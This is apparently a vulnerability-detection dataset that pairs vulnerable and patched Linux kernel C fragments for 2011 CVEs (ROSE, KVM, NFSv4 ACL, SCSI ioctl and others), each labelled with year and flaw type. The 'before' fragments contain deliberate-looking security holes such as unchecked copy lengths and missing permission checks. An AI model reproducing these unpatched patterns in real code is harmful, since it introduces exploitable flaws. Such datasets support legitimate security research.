 memcpy(&facilities->source_digis[facilities->source_ndigis++], pt, AX25_ADDR_LEN);

				}
			}
			p   += l + 2;

 case 0xC0:
			l = p[1];





 if (*p == FAC_CCITT_DEST_NSAP) {
 memcpy(&facilities->source_addr, p + 7, ROSE_ADDR_LEN);
 memcpy(callsign, p + 12,   l - 10);
 switch (*p) {
 case FAC_NATIONAL:		/* National */
				len = rose_parse_national(p + 1, facilities, facilities_len - 1);


				facilities_len -= len + 1;
				p += len + 1;
 break;

 case FAC_CCITT:		/* CCITT */
				len = rose_parse_ccitt(p + 1, facilities, facilities_len - 1);


				facilities_len -= len + 1;
				p += len + 1;
 break;
","				facilities->source_ndigis = 0;
				facilities->dest_ndigis   = 0;
 for (pt = p + 2, lg = 0 ; lg < l ; pt += AX25_ADDR_LEN, lg += AX25_ADDR_LEN) {
 if (pt[6] & AX25_HBIT) {
 if (facilities->dest_ndigis >= ROSE_MAX_DIGIS)
 return -1;
 memcpy(&facilities->dest_digis[facilities->dest_ndigis++], pt, AX25_ADDR_LEN);
					} else {
 if (facilities->source_ndigis >= ROSE_MAX_DIGIS)
 return -1;
 memcpy(&facilities->source_digis[facilities->source_ndigis++], pt, AX25_ADDR_LEN);
					}
				}
			}
			p   += l + 2;

 case 0xC0:
			l = p[1];

 /* Prevent overflows*/
 if (l < 10 || l > 20)
 return -1;

 if (*p == FAC_CCITT_DEST_NSAP) {
 memcpy(&facilities->source_addr, p + 7, ROSE_ADDR_LEN);
 memcpy(callsign, p + 12,   l - 10);
 switch (*p) {
 case FAC_NATIONAL:		/* National */
				len = rose_parse_national(p + 1, facilities, facilities_len - 1);
 if (len < 0)
 return 0;
				facilities_len -= len + 1;
				p += len + 1;
 break;

 case FAC_CCITT:		/* CCITT */
				len = rose_parse_ccitt(p + 1, facilities, facilities_len - 1);
 if (len < 0)
 return 0;
				facilities_len -= len + 1;
				p += len + 1;
 break;
"
2012,DoS Exec Code ,CVE-2011-4621,"
 setup_thread_stack(tsk, orig);
 clear_user_return_notifier(tsk);

	stackend = end_of_stack(tsk);
	*stackend = STACK_END_MAGIC;	/* for overflow detection */


inline void update_rq_clock(struct rq *rq)
{
 if (!rq->skip_clock_update) {
 int cpu = cpu_of(rq);
		u64 irq_time;

		rq->clock = sched_clock_cpu(cpu);
		irq_time = irq_time_cpu(cpu);
 if (rq->clock - irq_time > rq->clock_task)
			rq->clock_task = rq->clock - irq_time;

 sched_irq_time_avg_update(rq, irq_time);
	}




}

/*
	 * A queue event has occurred, and we're going to schedule.  In
	 * this case, we can save a useless back to back clock update.
 */
 if (test_tsk_need_resched(rq->curr))
		rq->skip_clock_update = 1;
}

{
 if (prev->se.on_rq)
 update_rq_clock(rq);
	rq->skip_clock_update = 0;
	prev->sched_class->put_prev_task(rq, prev);
}

 hrtick_clear(rq);

 raw_spin_lock_irq(&rq->lock);
 clear_tsk_need_resched(prev);

	switch_count = &prev->nivcsw;
 if (prev->state && !(preempt_count() & PREEMPT_ACTIVE)) {

 put_prev_task(rq, prev);
	next = pick_next_task(rq);



 if (likely(prev != next)) {
 sched_info_switch(prev, next);
		rq->nr_switches++;
		rq->curr = next;
		++*switch_count;


 context_switch(rq, prev, next); /* unlocks the rq */
 /*
","
 setup_thread_stack(tsk, orig);
 clear_user_return_notifier(tsk);
 clear_tsk_need_resched(tsk);
	stackend = end_of_stack(tsk);
	*stackend = STACK_END_MAGIC;	/* for overflow detection */


inline void update_rq_clock(struct rq *rq)
{
 int cpu = cpu_of(rq);
	u64 irq_time;


 if (rq->skip_clock_update)
 return;



	rq->clock = sched_clock_cpu(cpu);
	irq_time = irq_time_cpu(cpu);
 if (rq->clock - irq_time > rq->clock_task)
		rq->clock_task = rq->clock - irq_time;

 sched_irq_time_avg_update(rq, irq_time);
}

/*
	 * A queue event has occurred, and we're going to schedule.  In
	 * this case, we can save a useless back to back clock update.
 */
 if (rq->curr->se.on_rq && test_tsk_need_resched(rq->curr))
		rq->skip_clock_update = 1;
}

{
 if (prev->se.on_rq)
 update_rq_clock(rq);

	prev->sched_class->put_prev_task(rq, prev);
}

 hrtick_clear(rq);

 raw_spin_lock_irq(&rq->lock);


	switch_count = &prev->nivcsw;
 if (prev->state && !(preempt_count() & PREEMPT_ACTIVE)) {

 put_prev_task(rq, prev);
	next = pick_next_task(rq);
 clear_tsk_need_resched(prev);
	rq->skip_clock_update = 0;

 if (likely(prev != next)) {
 sched_info_switch(prev, next);
		rq->nr_switches++;
		rq->curr = next;
		++*switch_count;
 WARN_ON_ONCE(test_tsk_need_resched(next));

 context_switch(rq, prev, next); /* unlocks the rq */
 /*
"
2012,DoS Overflow ,CVE-2011-4611,"#define PV_970 0x0039
#define PV_POWER5 0x003A
#define PV_POWER5p 0x003B

#define PV_970FX 0x003C
#define PV_630 0x0040
#define PV_630p 0x0041
 return ip;
}























/*
 * Performance monitor interrupt stuff
 */
 if (is_limited_pmc(i + 1))
 continue;
			val = read_pmc(i + 1);
 if ((int)val < 0)
 write_pmc(i + 1, 0);
		}
	}
","#define PV_970 0x0039
#define PV_POWER5 0x003A
#define PV_POWER5p 0x003B
#define PV_POWER7 0x003F
#define PV_970FX 0x003C
#define PV_630 0x0040
#define PV_630p 0x0041
 return ip;
}

static bool pmc_overflow(unsigned long val)
{
 if ((int)val < 0)
 return true;

 /*
	 * Events on POWER7 can roll back if a speculative event doesn't
	 * eventually complete. Unfortunately in some rare cases they will
	 * raise a performance monitor exception. We need to catch this to
	 * ensure we reset the PMC. In all cases the PMC will be 256 or less
	 * cycles from overflow.
	 *
	 * We only do this if the first pass fails to find any overflowing
	 * PMCs because a user might set a period of less than 256 and we
	 * don't want to mistakenly reset them.
 */
 if (__is_processor(PV_POWER7) && ((0x80000000 - val) <= 256))
 return true;

 return false;
}

/*
 * Performance monitor interrupt stuff
 */
 if (is_limited_pmc(i + 1))
 continue;
			val = read_pmc(i + 1);
 if (pmc_overflow(val))
 write_pmc(i + 1, 0);
		}
	}
"
2013,DoS Overflow Mem. Corr. ,CVE-2011-4604,"
 spin_unlock_bh(&socket_client->lock);

 error = copy_to_user(buf, &socket_packet->icmp_packet,
  socket_packet->icmp_len);

	packet_len = socket_packet->icmp_len;
 kfree(socket_packet);

 if (error)
","
 spin_unlock_bh(&socket_client->lock);

 packet_len = min(count, socket_packet->icmp_len);
 error = copy_to_user(buf, &socket_packet->icmp_packet, packet_len);


 kfree(socket_packet);

 if (error)
"
2012,DoS ,CVE-2011-4594,"	 * used_address->name_len is initialized to UINT_MAX so that the first
	 * destination address never matches.
 */
 if (used_address && used_address->name_len == msg_sys->msg_namelen &&
	    !memcmp(&used_address->name, msg->msg_name,

		    used_address->name_len)) {
		err = sock_sendmsg_nosec(sock, msg_sys, total_len);
 goto out_freectl;
 */
 if (used_address && err >= 0) {
		used_address->name_len = msg_sys->msg_namelen;
 memcpy(&used_address->name, msg->msg_name,
		       used_address->name_len);

	}

out_freectl:
","	 * used_address->name_len is initialized to UINT_MAX so that the first
	 * destination address never matches.
 */
 if (used_address && msg_sys->msg_name &&
	    used_address->name_len == msg_sys->msg_namelen &&
	    !memcmp(&used_address->name, msg_sys->msg_name,
		    used_address->name_len)) {
		err = sock_sendmsg_nosec(sock, msg_sys, total_len);
 goto out_freectl;
 */
 if (used_address && err >= 0) {
		used_address->name_len = msg_sys->msg_namelen;
 if (msg_sys->msg_name)
 memcpy(&used_address->name, msg_sys->msg_name,
			       used_address->name_len);
	}

out_freectl:
"
2013,DoS ,CVE-2011-4348," */
 sctp_bh_lock_sock(sk);














 if (sock_owned_by_user(sk)) {
 SCTP_INC_STATS_BH(SCTP_MIB_IN_PKT_BACKLOG);
 sctp_add_backlog(sk, skb);
"," */
 sctp_bh_lock_sock(sk);

 if (sk != rcvr->sk) {
 /* Our cached sk is different from the rcvr->sk.  This is
		 * because migrate()/accept() may have moved the association
		 * to a new socket and released all the sockets.  So now we
		 * are holding a lock on the old socket while the user may
		 * be doing something with the new socket.  Switch our veiw
		 * of the current sk.
 */
 sctp_bh_unlock_sock(sk);
		sk = rcvr->sk;
 sctp_bh_lock_sock(sk);
	}

 if (sock_owned_by_user(sk)) {
 SCTP_INC_STATS_BH(SCTP_MIB_IN_PKT_BACKLOG);
 sctp_add_backlog(sk, skb);
"
2013,DoS ,CVE-2011-4347,"The KVM_DEV_ASSIGN_ENABLE_IOMMU flag is a mandatory option to ensure
isolation of the device.  Usages not specifying this flag are deprecated.





4.49 KVM_DEASSIGN_PCI_DEVICE

Capability: KVM_CAP_DEVICE_DEASSIGNMENT
#include <linux/pci.h>
#include <linux/interrupt.h>
#include <linux/slab.h>


#include ""irq.h""

static struct kvm_assigned_dev_kernel *kvm_find_assigned_dev(struct list_head *head,
 return r;
}





























































static int kvm_vm_ioctl_assign_device(struct kvm *kvm,
 struct kvm_assigned_pci_dev *assigned_dev)
{
 int r = 0, idx;
 struct kvm_assigned_dev_kernel *match;
 struct pci_dev *dev;


 if (!(assigned_dev->flags & KVM_DEV_ASSIGN_ENABLE_IOMMU))
 return -EINVAL;
		r = -EINVAL;
 goto out_free;
	}












 if (pci_enable_device(dev)) {
 printk(KERN_INFO ""%s: Could not enable PCI device\n"", __func__);
		r = -EBUSY;
","The KVM_DEV_ASSIGN_ENABLE_IOMMU flag is a mandatory option to ensure
isolation of the device.  Usages not specifying this flag are deprecated.

Only PCI header type 0 devices with PCI BAR resources are supported by
device assignment.  The user requesting this ioctl must have read/write
access to the PCI sysfs resource files associated with the device.

4.49 KVM_DEASSIGN_PCI_DEVICE

Capability: KVM_CAP_DEVICE_DEASSIGNMENT
#include <linux/pci.h>
#include <linux/interrupt.h>
#include <linux/slab.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include ""irq.h""

static struct kvm_assigned_dev_kernel *kvm_find_assigned_dev(struct list_head *head,
 return r;
}

/*
 * We want to test whether the caller has been granted permissions to
 * use this device.  To be able to configure and control the device,
 * the user needs access to PCI configuration space and BAR resources.
 * These are accessed through PCI sysfs.  PCI config space is often
 * passed to the process calling this ioctl via file descriptor, so we
 * can't rely on access to that file.  We can check for permissions
 * on each of the BAR resource files, which is a pretty clear
 * indicator that the user has been granted access to the device.
 */
static int probe_sysfs_permissions(struct pci_dev *dev)
{
#ifdef CONFIG_SYSFS
 int i;
 bool bar_found = false;

 for (i = PCI_STD_RESOURCES; i <= PCI_STD_RESOURCE_END; i++) {
 char *kpath, *syspath;
 struct path path;
 struct inode *inode;
 int r;

 if (!pci_resource_len(dev, i))
 continue;

		kpath = kobject_get_path(&dev->dev.kobj, GFP_KERNEL);
 if (!kpath)
 return -ENOMEM;

 /* Per sysfs-rules, sysfs is always at /sys */
		syspath = kasprintf(GFP_KERNEL, ""/sys%s/resource%d"", kpath, i);
 kfree(kpath);
 if (!syspath)
 return -ENOMEM;

		r = kern_path(syspath, LOOKUP_FOLLOW, &path);
 kfree(syspath);
 if (r)
 return r;

		inode = path.dentry->d_inode;

		r = inode_permission(inode, MAY_READ | MAY_WRITE | MAY_ACCESS);
 path_put(&path);
 if (r)
 return r;

		bar_found = true;
	}

 /* If no resources, probably something special */
 if (!bar_found)
 return -EPERM;

 return 0;
#else
 return -EINVAL; /* No way to control the device without sysfs */
#endif
}

static int kvm_vm_ioctl_assign_device(struct kvm *kvm,
 struct kvm_assigned_pci_dev *assigned_dev)
{
 int r = 0, idx;
 struct kvm_assigned_dev_kernel *match;
 struct pci_dev *dev;
	u8 header_type;

 if (!(assigned_dev->flags & KVM_DEV_ASSIGN_ENABLE_IOMMU))
 return -EINVAL;
		r = -EINVAL;
 goto out_free;
	}

 /* Don't allow bridges to be assigned */
 pci_read_config_byte(dev, PCI_HEADER_TYPE, &header_type);
 if ((header_type & PCI_HEADER_TYPE) != PCI_HEADER_TYPE_NORMAL) {
		r = -EPERM;
 goto out_put;
	}

	r = probe_sysfs_permissions(dev);
 if (r)
 goto out_put;

 if (pci_enable_device(dev)) {
 printk(KERN_INFO ""%s: Could not enable PCI device\n"", __func__);
		r = -EBUSY;
"
2012,DoS Exec Code Overflow ,CVE-2011-4330,,
2012,DoS ,CVE-2011-4326,"	skb->ip_summed = CHECKSUM_NONE;

 /* Check if there is enough headroom to insert fragment header. */
 if ((skb_headroom(skb) < frag_hdr_sz) &&
 pskb_expand_head(skb, frag_hdr_sz, 0, GFP_ATOMIC))
 goto out;

","	skb->ip_summed = CHECKSUM_NONE;

 /* Check if there is enough headroom to insert fragment header. */
 if ((skb_mac_header(skb) < skb->head + frag_hdr_sz) &&
 pskb_expand_head(skb, frag_hdr_sz, 0, GFP_ATOMIC))
 goto out;

"
2012,DoS ,CVE-2011-4325,,
2012,DoS ,CVE-2011-4324,"/*
 * Given an inode, search for an open context with the desired characteristics
 */
struct nfs_open_context *nfs_find_open_context(struct inode *inode, struct rpc_cred *cred, int mode)
{
 struct nfs_inode *nfsi = NFS_I(inode);
 struct nfs_open_context *pos, *ctx = NULL;
 unsigned int n_rdonly;		/* Number of read-only references */
 unsigned int n_wronly;		/* Number of write-only references */
 unsigned int n_rdwr;		/* Number of read/write references */
 int state;			/* State on the server (R,W, or RW) */
 atomic_t count;
};

extern void nfs4_put_state_owner(struct nfs4_state_owner *);
extern struct nfs4_state * nfs4_get_open_state(struct inode *, struct nfs4_state_owner *);
extern void nfs4_put_open_state(struct nfs4_state *);
extern void nfs4_close_state(struct path *, struct nfs4_state *, mode_t);
extern void nfs4_close_sync(struct path *, struct nfs4_state *, mode_t);
extern void nfs4_state_set_mode_locked(struct nfs4_state *, mode_t);
extern void nfs4_schedule_state_recovery(struct nfs_client *);
extern void nfs4_schedule_state_manager(struct nfs_client *);
extern int nfs4_state_mark_reclaim_nograce(struct nfs_client *clp, struct nfs4_state *state);
","/*
 * Given an inode, search for an open context with the desired characteristics
 */
struct nfs_open_context *nfs_find_open_context(struct inode *inode, struct rpc_cred *cred, fmode_t mode)
{
 struct nfs_inode *nfsi = NFS_I(inode);
 struct nfs_open_context *pos, *ctx = NULL;
 unsigned int n_rdonly;		/* Number of read-only references */
 unsigned int n_wronly;		/* Number of write-only references */
 unsigned int n_rdwr;		/* Number of read/write references */
 fmode_t state;			/* State on the server (R,W, or RW) */
 atomic_t count;
};

extern void nfs4_put_state_owner(struct nfs4_state_owner *);
extern struct nfs4_state * nfs4_get_open_state(struct inode *, struct nfs4_state_owner *);
extern void nfs4_put_open_state(struct nfs4_state *);
extern void nfs4_close_state(struct path *, struct nfs4_state *, fmode_t);
extern void nfs4_close_sync(struct path *, struct nfs4_state *, fmode_t);
extern void nfs4_state_set_mode_locked(struct nfs4_state *, fmode_t);
extern void nfs4_schedule_state_recovery(struct nfs_client *);
extern void nfs4_schedule_state_manager(struct nfs_client *);
extern int nfs4_state_mark_reclaim_nograce(struct nfs_client *clp, struct nfs4_state *state);
"
2012,DoS ,CVE-2011-4132,,
2012,DoS ,CVE-2011-4131," */
#define NFS4ACL_MAXPAGES (XATTR_SIZE_MAX >> PAGE_CACHE_SHIFT)

static void buf_to_pages(const void *buf, size_t buflen,
 struct page **pages, unsigned int *pgbase)
{
 const void *p = buf;

	*pgbase = offset_in_page(buf);
	p -= *pgbase;
 while (p < buf + buflen) {
		*(pages++) = virt_to_page(p);
		p += PAGE_CACHE_SIZE;
	}
}

static int buf_to_pages_noslab(const void *buf, size_t buflen,
 struct page **pages, unsigned int *pgbase)
{
 nfs4_set_cached_acl(inode, acl);
}











static ssize_t __nfs4_get_acl_uncached(struct inode *inode, void *buf, size_t buflen)
{
 struct page *pages[NFS4ACL_MAXPAGES];
 struct nfs_getaclargs args = {
		.fh = NFS_FH(inode),
		.acl_pages = pages,
		.rpc_argp = &args,
		.rpc_resp = &res,
	};
 struct page *localpage = NULL;
 int ret;

 if (buflen < PAGE_SIZE) {
 /* As long as we're doing a round trip to the server anyway,
		 * let's be prepared for a page of acl data. */
		localpage = alloc_page(GFP_KERNEL);
		resp_buf = page_address(localpage);
 if (localpage == NULL)
 return -ENOMEM;
		args.acl_pages[0] = localpage;
		args.acl_pgbase = 0;
		args.acl_len = PAGE_SIZE;
	} else {
		resp_buf = buf;
 buf_to_pages(buf, buflen, args.acl_pages, &args.acl_pgbase);



	}
	ret = nfs4_call_sync(NFS_SERVER(inode)->client, NFS_SERVER(inode), &msg, &args.seq_args, &res.seq_res, 0);











 if (ret)
 goto out_free;
 if (res.acl_len > args.acl_len)
 nfs4_write_cached_acl(inode, NULL, res.acl_len);


 else
 nfs4_write_cached_acl(inode, resp_buf, res.acl_len);

 if (buf) {
		ret = -ERANGE;
 if (res.acl_len > buflen)
 goto out_free;
 if (localpage)
 memcpy(buf, resp_buf, res.acl_len);
	}
	ret = res.acl_len;
out_free:
 if (localpage)
 __free_page(localpage);



 return ret;
}

 nfs_zap_acl_cache(inode);
	ret = nfs4_read_cached_acl(inode, buf, buflen);
 if (ret != -ENOENT)


 return ret;
 return nfs4_get_acl_uncached(inode, buf, buflen);
}
 encode_compound_hdr(xdr, req, &hdr);
 encode_sequence(xdr, &args->seq_args, &hdr);
 encode_putfh(xdr, args->fh, &hdr);
	replen = hdr.replen + op_decode_hdr_maxsz + nfs4_fattr_bitmap_maxsz + 1;
 encode_getattr_two(xdr, FATTR4_WORD0_ACL, 0, &hdr);

 xdr_inline_pages(&req->rq_rcv_buf, replen << 2,
		args->acl_pages, args->acl_pgbase, args->acl_len);


 encode_nops(&hdr);
}

}

static int decode_getacl(struct xdr_stream *xdr, struct rpc_rqst *req,
 size_t *acl_len)
{
	__be32 *savep;
 uint32_t attrlen,
		 bitmap[3] = {0};
 struct kvec *iov = req->rq_rcv_buf.head;
 int status;

 *acl_len = 0;
 if ((status = decode_op_hdr(xdr, OP_GETATTR)) != 0)
 goto out;

 if ((status = decode_attr_bitmap(xdr, bitmap)) != 0)
 goto out;
 if ((status = decode_attr_length(xdr, &attrlen, &savep)) != 0)
 size_t hdrlen;
		u32 recvd;








 /* We ignore &savep and don't do consistency checks on
		 * the attr length.  Let userspace figure it out.... */
		hdrlen = (u8 *)xdr->p - (u8 *)iov->iov_base;

		recvd = req->rq_rcv_buf.len - hdrlen;
 if (attrlen > recvd) {
 dprintk(""NFS: server cheating in getattr""
 "" acl reply: attrlen %u > recvd %u\n"",




					attrlen, recvd);
 return -EINVAL;
		}
 xdr_read_pages(xdr, attrlen);
 *acl_len = attrlen;
	} else
		status = -EOPNOTSUPP;

	status = decode_putfh(xdr);
 if (status)
 goto out;
	status = decode_getacl(xdr, rqstp, &res->acl_len);

out:
 return status;
 size_t				acl_len;
 unsigned int			acl_pgbase;
 struct page **			acl_pages;

 struct nfs4_sequence_args 	seq_args;
};



struct nfs_getaclres {
 size_t				acl_len;


 struct nfs4_sequence_res	seq_res;
};

 struct xdr_array2_desc *desc);
extern int xdr_encode_array2(struct xdr_buf *buf, unsigned int base,
 struct xdr_array2_desc *desc);



/*
 * Provide some simple tools for XDR buffer overflow-checking etc.
 * Copies data into an arbitrary memory location from an array of pages
 * The copy is assumed to be non-overlapping.
 */
static void
_copy_from_pages(char *p, struct page **pages, size_t pgbase, size_t len)
{
 struct page **pgfrom;

	} while ((len -= copy) != 0);
}


/*
 * xdr_shrink_bufhead
"," */
#define NFS4ACL_MAXPAGES (XATTR_SIZE_MAX >> PAGE_CACHE_SHIFT)














static int buf_to_pages_noslab(const void *buf, size_t buflen,
 struct page **pages, unsigned int *pgbase)
{
 nfs4_set_cached_acl(inode, acl);
}

/*
 * The getxattr API returns the required buffer length when called with a
 * NULL buf. The NFSv4 acl tool then calls getxattr again after allocating
 * the required buf.  On a NULL buf, we send a page of data to the server
 * guessing that the ACL request can be serviced by a page. If so, we cache
 * up to the page of ACL data, and the 2nd call to getxattr is serviced by
 * the cache. If not so, we throw away the page, and cache the required
 * length. The next getxattr call will then produce another round trip to
 * the server, this time with the input buf of the required size.
 */
static ssize_t __nfs4_get_acl_uncached(struct inode *inode, void *buf, size_t buflen)
{
 struct page *pages[NFS4ACL_MAXPAGES] = {NULL, };
 struct nfs_getaclargs args = {
		.fh = NFS_FH(inode),
		.acl_pages = pages,
		.rpc_argp = &args,
		.rpc_resp = &res,
	};
 int ret = -ENOMEM, npages, i, acl_len = 0;


	npages = (buflen + PAGE_SIZE - 1) >> PAGE_SHIFT;
 /* As long as we're doing a round trip to the server anyway,
	 * let's be prepared for a page of acl data. */
 if (npages == 0)
		npages = 1;

 for (i = 0; i < npages; i++) {
		pages[i] = alloc_page(GFP_KERNEL);
 if (!pages[i])
 goto out_free;
	}
 if (npages > 1) {
 /* for decoding across pages */
		args.acl_scratch = alloc_page(GFP_KERNEL);
 if (!args.acl_scratch)
 goto out_free;
	}
	args.acl_len = npages * PAGE_SIZE;
	args.acl_pgbase = 0;
 /* Let decode_getfacl know not to fail if the ACL data is larger than
	 * the page we send as a guess */
 if (buf == NULL)
		res.acl_flags |= NFS4_ACL_LEN_REQUEST;
	resp_buf = page_address(pages[0]);

 dprintk(""%s  buf %p buflen %ld npages %d args.acl_len %ld\n"",
		__func__, buf, buflen, npages, args.acl_len);
	ret = nfs4_call_sync(NFS_SERVER(inode)->client, NFS_SERVER(inode),
			     &msg, &args.seq_args, &res.seq_res, 0);
 if (ret)
 goto out_free;

	acl_len = res.acl_len - res.acl_data_offset;
 if (acl_len > args.acl_len)
 nfs4_write_cached_acl(inode, NULL, acl_len);
 else
 nfs4_write_cached_acl(inode, resp_buf + res.acl_data_offset,
				      acl_len);
 if (buf) {
		ret = -ERANGE;
 if (acl_len > buflen)
 goto out_free;
 _copy_from_pages(buf, pages, res.acl_data_offset,
  res.acl_len);
	}
	ret = acl_len;
out_free:
 for (i = 0; i < npages; i++)
 if (pages[i])
 __free_page(pages[i]);
 if (args.acl_scratch)
 __free_page(args.acl_scratch);
 return ret;
}

 nfs_zap_acl_cache(inode);
	ret = nfs4_read_cached_acl(inode, buf, buflen);
 if (ret != -ENOENT)
 /* -ENOENT is returned if there is no ACL or if there is an ACL
		 * but no cached acl data, just the acl length */
 return ret;
 return nfs4_get_acl_uncached(inode, buf, buflen);
}
 encode_compound_hdr(xdr, req, &hdr);
 encode_sequence(xdr, &args->seq_args, &hdr);
 encode_putfh(xdr, args->fh, &hdr);
	replen = hdr.replen + op_decode_hdr_maxsz + 1;
 encode_getattr_two(xdr, FATTR4_WORD0_ACL, 0, &hdr);

 xdr_inline_pages(&req->rq_rcv_buf, replen << 2,
		args->acl_pages, args->acl_pgbase, args->acl_len);
 xdr_set_scratch_buffer(xdr, page_address(args->acl_scratch), PAGE_SIZE);

 encode_nops(&hdr);
}

}

static int decode_getacl(struct xdr_stream *xdr, struct rpc_rqst *req,
  struct nfs_getaclres *res)
{
	__be32 *savep, *bm_p;
 uint32_t attrlen,
		 bitmap[3] = {0};
 struct kvec *iov = req->rq_rcv_buf.head;
 int status;

 res->acl_len = 0;
 if ((status = decode_op_hdr(xdr, OP_GETATTR)) != 0)
 goto out;
	bm_p = xdr->p;
 if ((status = decode_attr_bitmap(xdr, bitmap)) != 0)
 goto out;
 if ((status = decode_attr_length(xdr, &attrlen, &savep)) != 0)
 size_t hdrlen;
		u32 recvd;

 /* The bitmap (xdr len + bitmaps) and the attr xdr len words
		 * are stored with the acl data to handle the problem of
		 * variable length bitmaps.*/
		xdr->p = bm_p;
		res->acl_data_offset = be32_to_cpup(bm_p) + 2;
		res->acl_data_offset <<= 2;

 /* We ignore &savep and don't do consistency checks on
		 * the attr length.  Let userspace figure it out.... */
		hdrlen = (u8 *)xdr->p - (u8 *)iov->iov_base;
		attrlen += res->acl_data_offset;
		recvd = req->rq_rcv_buf.len - hdrlen;
 if (attrlen > recvd) {
 if (res->acl_flags & NFS4_ACL_LEN_REQUEST) {
 /* getxattr interface called with a NULL buf */
				res->acl_len = attrlen;
 goto out;
			}
 dprintk(""NFS: acl reply: attrlen %u > recvd %u\n"",
					attrlen, recvd);
 return -EINVAL;
		}
 xdr_read_pages(xdr, attrlen);
 res->acl_len = attrlen;
	} else
		status = -EOPNOTSUPP;

	status = decode_putfh(xdr);
 if (status)
 goto out;
	status = decode_getacl(xdr, rqstp, res);

out:
 return status;
 size_t				acl_len;
 unsigned int			acl_pgbase;
 struct page **			acl_pages;
 struct page *			acl_scratch;
 struct nfs4_sequence_args 	seq_args;
};

/* getxattr ACL interface flags */
#define NFS4_ACL_LEN_REQUEST 0x0001 /* zero length getxattr buffer */
struct nfs_getaclres {
 size_t				acl_len;
 size_t				acl_data_offset;
 int				acl_flags;
 struct nfs4_sequence_res	seq_res;
};

 struct xdr_array2_desc *desc);
extern int xdr_encode_array2(struct xdr_buf *buf, unsigned int base,
 struct xdr_array2_desc *desc);
extern void _copy_from_pages(char *p, struct page **pages, size_t pgbase,
 size_t len);

/*
 * Provide some simple tools for XDR buffer overflow-checking etc.
 * Copies data into an arbitrary memory location from an array of pages
 * The copy is assumed to be non-overlapping.
 */
void
_copy_from_pages(char *p, struct page **pages, size_t pgbase, size_t len)
{
 struct page **pgfrom;

	} while ((len -= copy) != 0);
}
EXPORT_SYMBOL_GPL(_copy_from_pages);

/*
 * xdr_shrink_bufhead
"
2012,Bypass ,CVE-2011-4127,"#include <linux/capability.h>
#include <linux/completion.h>
#include <linux/cdrom.h>

#include <linux/slab.h>
#include <linux/times.h>
#include <asm/uaccess.h>
}
EXPORT_SYMBOL(scsi_cmd_ioctl);







































int scsi_cmd_blk_ioctl(struct block_device *bd, fmode_t mode,
 unsigned int cmd, void __user *arg)
{






 return scsi_cmd_ioctl(bd->bd_disk->queue, bd->bd_disk, mode, cmd, arg);
}
EXPORT_SYMBOL(scsi_cmd_blk_ioctl);
 SCSI_LOG_IOCTL(1, sd_printk(KERN_INFO, sdkp, ""sd_ioctl: disk=%s, ""
 ""cmd=0x%x\n"", disk->disk_name, cmd));





 /*
	 * If we are in the middle of error recovery, don't let anyone
	 * else try and use this device.  Also, if error recovery fails, it
 unsigned int cmd, unsigned long arg)
{
 struct scsi_device *sdev = scsi_disk(bdev->bd_disk)->device;






 /*
	 * If we are in the middle of error recovery, don't let anyone
 return -ENODEV;

 if (sdev->host->hostt->compat_ioctl) {
 int ret;

		ret = sdev->host->hostt->compat_ioctl(sdev, cmd, (void __user *)arg);

 return ret;
 struct request *rq);
extern void blk_delay_queue(struct request_queue *, unsigned long);
extern void blk_recount_segments(struct request_queue *, struct bio *);

extern int scsi_cmd_blk_ioctl(struct block_device *, fmode_t,
 unsigned int, void __user *);
extern int scsi_cmd_ioctl(struct request_queue *, struct gendisk *, fmode_t,
","#include <linux/capability.h>
#include <linux/completion.h>
#include <linux/cdrom.h>
#include <linux/ratelimit.h>
#include <linux/slab.h>
#include <linux/times.h>
#include <asm/uaccess.h>
}
EXPORT_SYMBOL(scsi_cmd_ioctl);

int scsi_verify_blk_ioctl(struct block_device *bd, unsigned int cmd)
{
 if (bd && bd == bd->bd_contains)
 return 0;

 /* Actually none of these is particularly useful on a partition,
	 * but they are safe.
 */
 switch (cmd) {
 case SCSI_IOCTL_GET_IDLUN:
 case SCSI_IOCTL_GET_BUS_NUMBER:
 case SCSI_IOCTL_GET_PCI:
 case SCSI_IOCTL_PROBE_HOST:
 case SG_GET_VERSION_NUM:
 case SG_SET_TIMEOUT:
 case SG_GET_TIMEOUT:
 case SG_GET_RESERVED_SIZE:
 case SG_SET_RESERVED_SIZE:
 case SG_EMULATED_HOST:
 return 0;
 case CDROM_GET_CAPABILITY:
 /* Keep this until we remove the printk below.  udev sends it
		 * and we do not want to spam dmesg about it.   CD-ROMs do
		 * not have partitions, so we get here only for disks.
 */
 return -ENOIOCTLCMD;
 default:
 break;
	}

 /* In particular, rule out all resets and host-specific ioctls.  */
 printk_ratelimited(KERN_WARNING
 ""%s: sending ioctl %x to a partition!\n"", current->comm, cmd);

 return capable(CAP_SYS_RAWIO) ? 0 : -ENOIOCTLCMD;
}
EXPORT_SYMBOL(scsi_verify_blk_ioctl);

int scsi_cmd_blk_ioctl(struct block_device *bd, fmode_t mode,
 unsigned int cmd, void __user *arg)
{
 int ret;

	ret = scsi_verify_blk_ioctl(bd, cmd);
 if (ret < 0)
 return ret;

 return scsi_cmd_ioctl(bd->bd_disk->queue, bd->bd_disk, mode, cmd, arg);
}
EXPORT_SYMBOL(scsi_cmd_blk_ioctl);
 SCSI_LOG_IOCTL(1, sd_printk(KERN_INFO, sdkp, ""sd_ioctl: disk=%s, ""
 ""cmd=0x%x\n"", disk->disk_name, cmd));

	error = scsi_verify_blk_ioctl(bdev, cmd);
 if (error < 0)
 return error;

 /*
	 * If we are in the middle of error recovery, don't let anyone
	 * else try and use this device.  Also, if error recovery fails, it
 unsigned int cmd, unsigned long arg)
{
 struct scsi_device *sdev = scsi_disk(bdev->bd_disk)->device;
 int ret;

	ret = scsi_verify_blk_ioctl(bdev, cmd);
 if (ret < 0)
 return ret;

 /*
	 * If we are in the middle of error recovery, don't let anyone
 return -ENODEV;

 if (sdev->host->hostt->compat_ioctl) {


		ret = sdev->host->hostt->compat_ioctl(sdev, cmd, (void __user *)arg);

 return ret;
 struct request *rq);
extern void blk_delay_queue(struct request_queue *, unsigned long);
extern void blk_recount_segments(struct request_queue *, struct bio *);
extern int scsi_verify_blk_ioctl(struct block_device *, unsigned int);
extern int scsi_cmd_blk_ioctl(struct block_device *, fmode_t,
 unsigned int, void __user *);
extern int scsi_cmd_ioctl(struct request_queue *, struct gendisk *, fmode_t,
"
2012,DoS ,CVE-2011-4112,"
 /* Setup the generic properties */
	dev->flags = IFF_NOARP|IFF_POINTOPOINT;



	dev->header_ops = NULL;
	dev->netdev_ops = &isdn_netdev_ops;


 if (slave_dev->type != ARPHRD_ETHER)
 bond_setup_by_slave(bond_dev, slave_dev);
 else
 ether_setup(bond_dev);



 netdev_bonding_change(bond_dev,
